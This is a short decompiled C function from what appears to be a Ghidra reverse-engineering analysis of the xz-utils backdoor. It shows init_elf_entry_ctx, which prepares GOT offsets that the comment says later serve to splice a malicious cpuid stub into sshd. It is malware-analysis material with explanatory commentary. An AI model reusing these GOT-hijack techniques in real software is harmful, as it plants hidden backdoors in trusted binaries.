// /home/kali/xzre-ghidra/xzregh/104030_init_elf_entry_ctx.c
// Function: init_elf_entry_ctx @ 0x104030
// Calling convention: __stdcall
// Prototype: void __stdcall init_elf_entry_ctx(elf_entry_ctx_t * ctx)


/*
 * AutoDoc: Seeds an `elf_entry_ctx_t` prior to running the IFUNC resolvers. It records the address of `cpuid_random_symbol`, captures the
 * caller's return address from the saved frame (slot 3), recomputes the GOT anchor offset via `update_got_offset`, primes the
 * cpuid GOT index with `update_cpuid_got_index`, and clears the cached `tls_got_entry` so the resolver will refill it. The context
 * is later consumed by the GOT patching code that splices the malicious cpuid stub into sshd.
 */

#include "xzre_types.h"

void init_elf_entry_ctx(elf_entry_ctx_t *ctx)

{
  ctx->cpuid_random_symbol_addr = &_Lrc_read_destroy;
  (ctx->got_ctx).cpuid_got_slot = (void *)ctx->resolver_frame[3];
  update_got_offset(ctx);
  update_cpuid_got_index(ctx);
  (ctx->got_ctx).tls_got_entry = (void *)0x0;
  return;
}

